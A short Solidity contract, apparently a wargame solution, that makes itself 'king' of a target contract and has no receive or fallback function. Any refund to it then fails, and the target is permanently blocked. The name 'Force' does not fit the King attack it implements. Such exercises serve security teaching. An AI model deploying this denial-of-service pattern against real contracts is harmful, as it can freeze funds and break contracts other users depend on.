// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
// The idea is to make this contract the king so that whenever the instance of the level tries to send back to it its ether, it won't be able since this contract hasn't either a fallback and receive payable functions
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
